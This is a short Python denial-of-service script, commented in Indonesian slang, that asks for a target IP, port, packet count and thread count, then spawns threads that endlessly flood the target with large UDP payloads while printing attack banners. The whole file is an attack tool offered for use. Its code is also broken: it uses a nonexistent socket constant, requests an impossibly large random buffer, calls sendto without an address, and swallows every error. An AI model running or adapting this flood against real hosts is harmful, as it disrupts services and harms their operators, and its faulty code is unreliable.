#simpledosudp
#codebyxalbador
import socket
import random
import threading
import os,sys

print("TOOLS KEMREN BANG!!!")

ip_wibu = str(input("Ip Target : "))
port_wibu = int(input("Port Target : "))
paket_wibu = int(input("Paket Dari Wibu : "))
threads_wibu = int(input("Thread Dari Wibu : "))
os.system("clear")

def wibu():
    asu = random._urandom(999999999999999999)#ubah angka urandom= damage
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip_wibu,port_wibu))
            s.sendto(asu)
            for x in range(paket_wibu):
                s.sendto(asu)
            print("[•] VINZ WIBU ATTACK!!!")
        except:
            print("[•] VINZ WIBU ATTACK!!!")

for y in range(threads_wibu):
    th = threading.Thread(target=wibu)
    th.start()
